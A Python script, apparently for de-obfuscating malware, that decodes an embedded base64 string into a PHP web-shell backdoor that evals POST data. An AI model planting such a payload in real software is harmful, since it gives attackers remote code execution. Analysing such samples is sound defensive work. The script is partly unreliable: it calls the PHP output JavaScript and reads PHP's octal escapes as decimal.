import base64
import re

def base64_decode(encoded_string: str) -> str:
    """Base64 decodes the given string."""
    try:
        decoded_bytes = base64.b64decode(encoded_string)
        return decoded_bytes.decode('utf-8')
    except Exception as e:
        print(f"Error decoding base64: {e}")
        raise

def decode_escape_sequences(decoded_code: str) -> str:
    """Decodes hexadecimal and decimal escape sequences in the decoded code."""
    def decode_hex(match):
        """Helper function to decode escape sequences."""
        hex_value = match.group(0)[1:]  # Remove the backslash
        if hex_value.startswith('x'):  # Hexadecimal format like \x4F
            return chr(int(hex_value[1:], 16))  # Convert hex to character
        else:  # Decimal format like \97
            return chr(int(hex_value, 10))  # Convert decimal to character

    # Regular expression to match both hex (\x4F) and decimal (\97) escape sequences
    decoded_with_escaped_sequences = re.sub(r'\\x[0-9A-Fa-f]{2}|\\[0-9]+', decode_hex, decoded_code)

    return decoded_with_escaped_sequences

def decode_strings(encoded_string_1: str, encoded_string_2: str) -> str:
    """Decodes two Base64 encoded strings and combines them into the final code."""
    print("Decoding first string ($_)...")
    decoded_string_1 = base64_decode(encoded_string_1)
    print(f"Decoded string 1 (from $_):\n{decoded_string_1}")

    print("\nDecoding second string ($__)...")
    decoded_string_2 = base64_decode(encoded_string_2)
    print(f"Decoded string 2 (from $__):\n{decoded_string_2}")

    final_code = decoded_string_1
    return final_code

def main():
    """Main function to handle the entire decoding process."""
    # Encoded strings (replace these with actual values)
    encoded_string_1 = 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7'
    encoded_string_2 = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7'

    try:
        # Step 1: Decode and combine both strings
        final_code = decode_strings(encoded_string_1, encoded_string_2)

        # Step 2: Decode escape sequences in the final combined code
        decoded_code = decode_escape_sequences(final_code)

        # Step 3: Print the fully de-obfuscated JavaScript code
        print("\nFinal De-obfuscated JavaScript Code (with decoded hex/decimal sequences):")
        print(decoded_code)

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
